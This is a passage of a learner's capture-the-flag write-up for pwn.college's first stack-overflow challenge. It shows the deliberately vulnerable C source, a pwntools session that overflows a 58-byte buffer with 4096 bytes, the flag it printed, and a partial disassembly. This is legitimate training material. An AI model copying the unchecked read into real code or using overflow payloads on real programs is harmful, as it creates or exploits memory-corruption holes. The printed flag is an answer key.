# Your First Overflow (EASY)


### The flag : `pwn.college{028ZqHhq93fLat68HKK5UNA96NK.0VO4IDLzQjN0czW}`


### Solve
- This is the first challenge in the binary exploitation domain in pwn.college modules.

i ran this to inspect the code first : 

```
cat binary-exploitation-first-overflow-w.c
```

 on inspecting and commenting on the code to understand whats happening -
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 3422; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp) // from main
{
    struct 
    {
        char input[58]; // input reads 58 bytes
        int win_variable; // 4 bytes
    } data  = {0} ;

    unsigned long size = 0; // var size initialised to 0 

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 58);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, when this variable is non-zero, the flag will be printed.\n");
    printf("You can make this variable be non-zero by overflowing the input buffer.\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 58);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("\n");

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp) // lets start from here,
{
    setvbuf(stdin, NULL, _IONBF, 0); // direct syscall cmdline input and output
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp); // runs challenge  so lets go insepct the challenge fn
}
```


when i read those instructional printf statements i see that all instructions to solve this chall are already given so i just followed them and sent 4096 bytes of 'A' using ipython.

```python
n [1]: from pwn import *

In [2]: p=process('./binary-exploitation-first-overflow-w')
[x] Starting local process './binary-exploitation-first-overflow-w'
[+] Starting local process './binary-exploitation-first-overflow-w': pid 195

In [3]: payload=b'A'*4096

In [4]: p.send(payload)

In [5]: print(p.recvall(timeout=1))
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow-w' stopped with exit code -6 (SIGABRT) (pid 195)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 5.82KB
[+] Receiving all data: Done (5.82KB)
```


```python
Starting program: /challenge/binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd1edabc60 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabc68 (rsp+0x0008) | 28 ce da 1e fd 7f 00 00 | 0x00007ffd1edace28 |
| 0x00007ffd1edabc70 (rsp+0x0010) | 18 ce da 1e fd 7f 00 00 | 0x00007ffd1edace18 |
| 0x00007ffd1edabc78 (rsp+0x0018) | 25 65 1d 54 01 00 00 00 | 0x00000001541d6525 |
| 0x00007ffd1edabc80 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffd1edabc88 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabc90 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabc98 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabca0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabca8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabcb0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabcb8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabcc0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabcc8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd1edabcd0 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffd1edabcd8 (rsp+0x0078) | 00 8c ce da 52 5a ac 87 | 0x87ac5a52dace8c00 |
| 0x00007ffd1edabce0 (rsp+0x0080) | 20 cd da 1e fd 7f 00 00 | 0x00007ffd1edacd20 |
| 0x00007ffd1edabce8 (rsp+0x0088) | 36 28 40 00 00 00 00 00 | 0x0000000000402836 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd1edabc60, and our base pointer points to 0x7ffd1edabce0.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffd1edabc90, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 58 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffd1edabccc, 60 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffd1edabc90 (the start of the input buffer)
right up to (but not including) 0x7ffd1edacc90 (which is 4038 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
^C
Program received signal SIGINT, Interrupt.
0x00007aeb542521f2 in __GI___libc_read (fd=0, buf=0x7ffd1edabc90, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:26
warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
(gdb) exit
A debugging session is active.

        Inferior 1 [process 185] will be killed.

Quit anyway? (y or n) y
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ ipython
Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322]
Type 'copyright', 'credits' or 'license' for more information
IPython 9.2.0 -- An enhanced Interactive Python. Type '?' for help.
Tip: IPython's first line of code was written 24 years ago by Fernando PÃ©rez

In [1]: from pwn import *

In [2]: p=process('./binary-exploitation-first-overflow-w')
[x] Starting local process './binary-exploitation-first-overflow-w'
[+] Starting local process './binary-exploitation-first-overflow-w': pid 195

In [3]: payload=b'A'*4096

In [4]: p.send(payload)

In [5]: print(p.recvall(timeout=1))
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-first-overflow-w' stopped with exit code -6 (SIGABRT) (pid 195)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 5.82KB
[+] Receiving all data: Done (5.82KB)
b'The challenge() function has just been launched!\nBefore we do anything, let\'s take a look at challenge()\'s stack frame:\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffcf2d05fb0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05fb8 (rsp+0x0008) | 78 71 d0 f2 fc 7f 00 00 | 0x00007ffcf2d07178 |\n| 0x00007ffcf2d05fc0 (rsp+0x0010) | 68 71 d0 f2 fc 7f 00 00 | 0x00007ffcf2d07168 |\n| 0x00007ffcf2d05fc8 (rsp+0x0018) | 25 b5 06 ba 01 00 00 00 | 0x00000001ba06b525 |\n| 0x00007ffcf2d05fd0 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007ffcf2d05fd8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05fe0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05fe8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05ff0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05ff8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d06000 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d06008 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d06010 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d06018 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d06020 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |\n| 0x00007ffcf2d06028 (rsp+0x0078) | 00 1b 5b 3f e8 ea 9e 49 | 0x499eeae83f5b1b00 |\n| 0x00007ffcf2d06030 (rsp+0x0080) | 70 70 d0 f2 fc 7f 00 00 | 0x00007ffcf2d07070 |\n| 0x00007ffcf2d06038 (rsp+0x0088) | 36 28 40 00 00 00 00 00 | 0x0000000000402836 |\n+---------------------------------+-------------------------+--------------------+\nOur stack pointer points to 0x7ffcf2d05fb0, and our base pointer points to 0x7ffcf2d06030.\nThis means that we have (decimal) 18 8-byte words in our stack frame,\nincluding the saved base pointer and the saved return address, for a\ntotal of 144 bytes.\nThe input buffer begins at 0x7ffcf2d05fe0, partway through the stack frame,\n("above" it in the stack are other local variables used by the function).\nYour input will be read into this buffer.\nThe buffer is 58 bytes long, but the program will let you provide an arbitrarily\nlarge input length, and thus overflow the buffer.\n\nIn this level, there is a "win" variable.\nBy default, the value of this variable is zero.\nHowever, when this variable is non-zero, the flag will be printed.\nYou can make this variable be non-zero by overflowing the input buffer.\nThe "win" variable is stored at 0x7ffcf2d0601c, 60 bytes after the start of your input buffer.\n\nWe have disabled the following standard memory corruption mitigations for this challenge:\n- the binary is *not* position independent. This means that it will be\nlocated at the same spot every time it is run, which means that by\nanalyzing the binary (using objdump or reading this output), you can\nknow the exact value that you need to overwrite the return address with.\n\nYou have chosen to send 4096 bytes of input!\nThis will allow you to write from 0x7ffcf2d05fe0 (the start of the input buffer)\nright up to (but not including) 0x7ffcf2d06fe0 (which is 4038 bytes beyond the end of the buffer).\nSend your payload (up to 4096 bytes)!\nYou sent 4096 bytes!\nLet\'s see what happened with the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffcf2d05fb0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffcf2d05fb8 (rsp+0x0008) | 78 71 d0 f2 fc 7f 00 00 | 0x00007ffcf2d07178 |\n| 0x00007ffcf2d05fc0 (rsp+0x0010) | 68 71 d0 f2 fc 7f 00 00 | 0x00007ffcf2d07168 |\n| 0x00007ffcf2d05fc8 (rsp+0x0018) | 25 b5 06 ba 01 00 00 00 | 0x00000001ba06b525 |\n| 0x00007ffcf2d05fd0 (rsp+0x0020) | 00 10 00 00 00 10 00 00 | 0x0000100000001000 |\n| 0x00007ffcf2d05fd8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007ffcf2d05fe0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d05fe8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d05ff0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d05ff8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06000 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06008 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06010 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06018 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06020 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06028 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06030 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffcf2d06038 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n+---------------------------------+-------------------------+--------------------+\nThe program\'s memory status:\n- the input buffer starts at 0x7ffcf2d05fe0\n- the saved frame pointer (of main) is at 0x7ffcf2d06030\n- the saved return address (previously to main) is at 0x7ffcf2d06038\n- the saved return address is now pointing to 0x4141414141414141.\n- the canary is stored at 0x7ffcf2d06028.\n- the canary value is now 0x4141414141414141.\n- the address of the win variable is 0x7ffcf2d0601c.\n- the value of the win variable is 0x41414141.\n\nYou win! Here is your flag:\npwn.college{028ZqHhq93fLat68HKK5UNA96NK.0VO4IDLzQjN0czW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'

In [6]: exit()
hacker@binary-exploitation~your-first-overflow-easy:/challenge$
```


AND this i got the Flag.

The flag : `pwn.college{028ZqHhq93fLat68HKK5UNA96NK.0VO4IDLzQjN0czW}`

but whats the point of solving if we dont understand why this happens so lets do some gdb and objdump.

```
objdump -M intel -d ./binary-exploitation-first-overflow-w
```

output : 
i have stripped all the useless parts

```python
./binary-exploitation-first-overflow-w:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64
  401004:       48 83 ec 08             sub    rsp,0x8
  401008:       48 8b 05 e9 3f 00 00    mov    rax,QWORD PTR [rip+0x3fe9]        # 404ff8 <__gmon_start__>
  40100f:       48 85 c0                test   rax,rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   rax
  401016:       48 83 c4 08             add    rsp,0x8
  40101a:       c3                      ret

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 5a 3f 00 00       push   QWORD PTR [rip+0x3f5a]        # 404f80 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 5b 3f 00 00    bnd jmp QWORD PTR [rip+0x3f5b]        # 404f88 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nop    DWORD PTR [rax]
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <.plt>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <.plt>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64
  401054:       68 02 00 00 00          push   0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <.plt>
  40105f:       90                      nop
  401060:       f3 0f 1e fa             endbr64
  401064:       68 03 00 00 00          push   0x3
  401069:       f2 e9 b1 ff ff ff       bnd jmp 401020 <.plt>
  40106f:       90                      nop
  401070:       f3 0f 1e fa             endbr64
  401074:       68 04 00 00 00          push   0x4
  401079:       f2 e9 a1 ff ff ff       bnd jmp 401020 <.plt>
  40107f:       90                      nop
  401080:       f3 0f 1e fa             endbr64
  401084:       68 05 00 00 00          push   0x5
  401089:       f2 e9 91 ff ff ff       bnd jmp 401020 <.plt>
  40108f:       90                      nop
  401090:       f3 0f 1e fa             endbr64
  401094:       68 06 00 00 00          push   0x6
  401099:       f2 e9 81 ff ff ff       bnd jmp 401020 <.plt>
  40109f:       90                      nop
  4010a0:       f3 0f 1e fa             endbr64
  4010a4:       68 07 00 00 00          push   0x7
  4010a9:       f2 e9 71 ff ff ff       bnd jmp 401020 <.plt>
  4010af:       90                      nop
  4010b0:       f3 0f 1e fa             endbr64
  4010b4:       68 08 00 00 00          push   0x8
  4010b9:       f2 e9 61 ff ff ff       bnd jmp 401020 <.plt>
  4010bf:       90                      nop
  4010c0:       f3 0f 1e fa             endbr64
  4010c4:       68 09 00 00 00          push   0x9
  4010c9:       f2 e9 51 ff ff ff       bnd jmp 401020 <.plt>
  4010cf:       90                      nop
  4010d0:       f3 0f 1e fa             endbr64
  4010d4:       68 0a 00 00 00          push   0xa
  4010d9:       f2 e9 41 ff ff ff       bnd jmp 401020 <.plt>
  4010df:       90                      nop
  4010e0:       f3 0f 1e fa             endbr64
  4010e4:       68 0b 00 00 00          push   0xb
  4010e9:       f2 e9 31 ff ff ff       bnd jmp 401020 <.plt>
  4010ef:       90                      nop

Disassembly of section .plt.sec:

00000000004010f0 <putchar@plt>:
  4010f0:       f3 0f 1e fa             endbr64
  4010f4:       f2 ff 25 95 3e 00 00    bnd jmp QWORD PTR [rip+0x3e95]        # 404f90 <putchar@GLIBC_2.2.5>
  4010fb:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <__errno_location@plt>:
  401100:       f3 0f 1e fa             endbr64
  401104:       f2 ff 25 8d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e8d]        # 404f98 <__errno_location@GLIBC_2.2.5>
  40110b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401110 <puts@plt>:
  401110:       f3 0f 1e fa             endbr64
  401114:       f2 ff 25 85 3e 00 00    bnd jmp QWORD PTR [rip+0x3e85]        # 404fa0 <puts@GLIBC_2.2.5>
  40111b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401120 <write@plt>:
  401120:       f3 0f 1e fa             endbr64
  401124:       f2 ff 25 7d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e7d]        # 404fa8 <write@GLIBC_2.2.5>
  40112b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401130 <__stack_chk_fail@plt>:
  401130:       f3 0f 1e fa             endbr64
  401134:       f2 ff 25 75 3e 00 00    bnd jmp QWORD PTR [rip+0x3e75]        # 404fb0 <__stack_chk_fail@GLIBC_2.4>
  40113b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401140 <printf@plt>:
  401140:       f3 0f 1e fa             endbr64
  401144:       f2 ff 25 6d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e6d]        # 404fb8 <printf@GLIBC_2.2.5>
  40114b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401150 <geteuid@plt>:
  401150:       f3 0f 1e fa             endbr64
  401154:       f2 ff 25 65 3e 00 00    bnd jmp QWORD PTR [rip+0x3e65]        # 404fc0 <geteuid@GLIBC_2.2.5>
  40115b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401160 <read@plt>:
  401160:       f3 0f 1e fa             endbr64
  401164:       f2 ff 25 5d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e5d]        # 404fc8 <read@GLIBC_2.2.5>
  40116b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401170 <setvbuf@plt>:
  401170:       f3 0f 1e fa             endbr64
  401174:       f2 ff 25 55 3e 00 00    bnd jmp QWORD PTR [rip+0x3e55]        # 404fd0 <setvbuf@GLIBC_2.2.5>
  40117b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401180 <open@plt>:
  401180:       f3 0f 1e fa             endbr64
  401184:       f2 ff 25 4d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e4d]        # 404fd8 <open@GLIBC_2.2.5>
  40118b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401190 <exit@plt>:
  401190:       f3 0f 1e fa             endbr64
  401194:       f2 ff 25 45 3e 00 00    bnd jmp QWORD PTR [rip+0x3e45]        # 404fe0 <exit@GLIBC_2.2.5>
  40119b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

00000000004011a0 <strerror@plt>:
  4011a0:       f3 0f 1e fa             endbr64
  4011a4:       f2 ff 25 3d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e3d]        # 404fe8 <strerror@GLIBC_2.2.5>
  4011ab:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

00000000004011b0 <_start>:
  4011b0:       f3 0f 1e fa             endbr64
  4011b4:       31 ed                   xor    ebp,ebp
  4011b6:       49 89 d1                mov    r9,rdx
  4011b9:       5e                      pop    rsi
  4011ba:       48 89 e2                mov    rdx,rsp
  4011bd:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
  4011c1:       50                      push   rax
  4011c2:       54                      push   rsp
  4011c3:       49 c7 c0 d0 28 40 00    mov    r8,0x4028d0
  4011ca:       48 c7 c1 60 28 40 00    mov    rcx,0x402860
  4011d1:       48 c7 c7 a1 27 40 00    mov    rdi,0x4027a1
  4011d8:       ff 15 12 3e 00 00       call   QWORD PTR [rip+0x3e12]        # 404ff0 <__libc_start_main@GLIBC_2.2.5>
  4011de:       f4                      hlt
  4011df:       90                      nop

00000000004011e0 <_dl_relocate_static_pie>:
  4011e0:       f3 0f 1e fa             endbr64
  4011e4:       c3                      ret
  4011e5:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4011ec:       00 00 00
  4011ef:       90                      nop

00000000004011f0 <deregister_tm_clones>:
  4011f0:       b8 10 50 40 00          mov    eax,0x405010
  4011f5:       48 3d 10 50 40 00       cmp    rax,0x405010
  4011fb:       74 13                   je     401210 <deregister_tm_clones+0x20>
  4011fd:       b8 00 00 00 00          mov    eax,0x0
  401202:       48 85 c0                test   rax,rax
  401205:       74 09                   je     401210 <deregister_tm_clones+0x20>
  401207:       bf 10 50 40 00          mov    edi,0x405010
  40120c:       ff e0                   jmp    rax
  40120e:       66 90                   xchg   ax,ax
  401210:       c3                      ret
  401211:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401218:       00 00 00 00
  40121c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401220 <register_tm_clones>:
  401220:       be 10 50 40 00          mov    esi,0x405010
  401225:       48 81 ee 10 50 40 00    sub    rsi,0x405010
  40122c:       48 89 f0                mov    rax,rsi
  40122f:       48 c1 ee 3f             shr    rsi,0x3f
  401233:       48 c1 f8 03             sar    rax,0x3
  401237:       48 01 c6                add    rsi,rax
  40123a:       48 d1 fe                sar    rsi,1
  40123d:       74 11                   je     401250 <register_tm_clones+0x30>
  40123f:       b8 00 00 00 00          mov    eax,0x0
  401244:       48 85 c0                test   rax,rax
  401247:       74 07                   je     401250 <register_tm_clones+0x30>
  401249:       bf 10 50 40 00          mov    edi,0x405010
  40124e:       ff e0                   jmp    rax
  401250:       c3                      ret
  401251:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401258:       00 00 00 00
  40125c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401260 <__do_global_dtors_aux>:
  401260:       f3 0f 1e fa             endbr64
  401264:       80 3d cd 3d 00 00 00    cmp    BYTE PTR [rip+0x3dcd],0x0        # 405038 <completed.8061>
  40126b:       75 13                   jne    401280 <__do_global_dtors_aux+0x20>
  40126d:       55                      push   rbp
  40126e:       48 89 e5                mov    rbp,rsp
  401271:       e8 7a ff ff ff          call   4011f0 <deregister_tm_clones>
  401276:       c6 05 bb 3d 00 00 01    mov    BYTE PTR [rip+0x3dbb],0x1        # 405038 <completed.8061>
  40127d:       5d                      pop    rbp
  40127e:       c3                      ret
  40127f:       90                      nop
  401280:       c3                      ret
  401281:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401288:       00 00 00 00
  40128c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401290 <frame_dummy>:
  401290:       f3 0f 1e fa             endbr64
  401294:       eb 8a                   jmp    401220 <register_tm_clones>

0000000000401296 <DUMP_STACK>:
  401296:       f3 0f 1e fa             endbr64
  40129a:       55                      push   rbp
  40129b:       48 89 e5                mov    rbp,rsp
  40129e:       41 55                   push   r13
  4012a0:       41 54                   push   r12
  4012a2:       53                      push   rbx
  4012a3:       48 83 ec 18             sub    rsp,0x18
  4012a7:       48 89 7d d8             mov    QWORD PTR [rbp-0x28],rdi
  4012ab:       48 89 75 d0             mov    QWORD PTR [rbp-0x30],rsi
  4012af:       48 8d 3d 52 1d 00 00    lea    rdi,[rip+0x1d52]        # 403008 <_IO_stdin_used+0x8>
  4012b6:       e8 55 fe ff ff          call   401110 <puts@plt>
  4012bb:       48 8d 0d 99 1d 00 00    lea    rcx,[rip+0x1d99]        # 40305b <_IO_stdin_used+0x5b>
